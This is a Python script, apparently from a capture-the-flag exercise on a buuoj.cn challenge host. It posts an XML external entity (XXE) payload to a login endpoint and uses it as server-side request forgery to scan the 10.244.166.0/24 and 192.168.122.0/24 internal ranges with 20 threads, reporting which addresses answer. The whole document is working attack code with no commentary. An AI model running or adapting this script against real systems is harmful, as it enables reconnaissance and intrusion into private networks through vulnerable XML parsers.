import requests
import concurrent.futures

url = "http://6da84da2-6614-4fbd-a8a7-f77474fa0c0b.node5.buuoj.cn:81/doLogin.php"

def test_ip(ip):
    payload = f'''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "http://{ip}/">
]>
<user><username>&xxe;</username><password>test</password></user>'''
    
    try:
        r = requests.post(url, data=payload, headers={"Content-Type": "application/xml;charset=utf-8"}, timeout=2)
        if "failed to open stream" not in r.text and "Connection refused" not in r.text and "Gateway Time-out" not in r.text:
            return (ip, r.text[:300])
    except:
        pass
    return None

# Try common internal IP ranges
ips = []
# 10.244.166.0/24
for i in range(1, 255):
    ips.append(f"10.244.166.{i}")
# 192.168.122.0/24
for i in range(1, 255):
    ips.append(f"192.168.122.{i}")

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    results = executor.map(test_ip, ips)
    for r in results:
        if r:
            print(f"[+] Found: {r[0]}")
            print(r[1])
            print("---")
